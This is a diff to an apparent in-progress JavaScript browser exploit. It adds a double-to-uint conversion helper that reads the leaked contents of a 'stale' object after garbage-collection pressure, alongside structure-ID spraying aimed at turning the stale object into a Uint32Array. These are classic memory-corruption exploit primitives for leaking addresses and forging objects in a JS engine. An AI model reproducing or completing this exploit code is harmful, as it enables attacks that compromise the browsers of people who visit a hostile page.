@@ -38,6 +38,14 @@
  	_dview.setUint32(4, low);
  	return _dview.getFloat64(0);
  }
+// unwraps uints from double 
+function d2u(d)
+{
+	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+	_dview.setFloat64(0,d);
+	return { low: _dview.getUint32(4), 
+	         hi:  _dview.getUint32(0) };    
+}
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
 var pressure = new Array(100);
@@ -166,7 +174,9 @@ for (var i = 0; i < 0x1000; i++){
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
 				alert("Gonna access stale");
-				alert(stale[1]['a']);
+				sa = d2u(stale[1]['a']);
+				alert("sa.hi=" + sa.hi);
+				alert("sa.low=" + sa.low);
 				alert("After accesing stale");
 				while(!(stale[0] instanceof Uint32Array)) {
 				    structID++;
